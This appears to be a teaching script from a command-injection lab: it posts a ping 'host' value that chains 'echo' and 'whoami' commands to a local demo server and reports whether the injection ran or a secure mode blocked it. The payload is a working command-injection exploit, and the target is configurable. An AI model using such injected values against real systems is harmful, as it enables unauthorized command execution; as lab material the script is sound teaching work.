'use strict';

/**
 * Attack 1 — Command chaining (CWE-78).
 *
 * The "host" field is supposed to hold something like 127.0.0.1. We instead
 * send `127.0.0.1 <sep> echo <marker> <sep> whoami`. In vulnerable mode the
 * server concatenates this into a shell command, so the shell runs SEVERAL
 * commands: the ping, an `echo` of a unique marker (a reliable, locale-proof
 * signal that our code ran), and `whoami` (which reveals the server's OS
 * account). Both coming back in the output proves we can run commands of our
 * own choosing.
 *
 * This talks ONLY to the local demo server (http://localhost:5000). `echo` and
 * `whoami` are read-only. Run the server first:
 *   npm run start:vulnerable   (or start:secure to watch it get blocked)
 */
const BASE = process.env.TARGET || 'http://localhost:5000';
const SEP = process.platform === 'win32' ? '&' : ';';
const MARKER = `INJECTED-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
const PAYLOAD = `127.0.0.1 ${SEP} echo ${MARKER} ${SEP} whoami`;

async function run(host) {
  const res = await fetch(`${BASE}/run`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
    body: JSON.stringify({ tool: 'ping', host }),
  });
  return res.json();
}

(async () => {
  console.log('=== Attack 1: command chaining ===');
  console.log(`Target : ${BASE}/run`);
  console.log(`Payload: tool=ping  host="${PAYLOAD}"`);
  console.log('');

  let data;
  try {
    data = await run(PAYLOAD);
  } catch (err) {
    console.error(`Could not reach the server (${err.message}).`);
    console.error('Start it first with:  npm run start:vulnerable');
    process.exit(1);
  }

  const r = data.result;
  console.log(`Server mode : ${data.secure ? 'SECURE' : 'VULNERABLE'}`);

  if (!r.ran) {
    console.log(`Guard       : BLOCKED — ${r.guard.reason}`);
    console.log('\nResult: injection PREVENTED. No extra command ran.');
    return;
  }

  console.log(`Command run : ${r.commandShown}`);
  const out = `${r.stdout}\n${r.stderr}`.trim();
  console.log('\n--- captured output ---');
  console.log(out || '(none)');
  console.log('-----------------------');

  if (out.includes(MARKER)) {
    console.log(
      `\nResult: injection SUCCEEDED. Our marker ${MARKER} appears in the output,` +
        '\nso the shell ran our injected commands — and `whoami` above is the account the' +
        '\nserver runs as, which a "ping a host" feature should never expose.'
    );
  } else {
    console.log('\nResult: marker not found — injection did NOT succeed in this mode.');
  }
})();
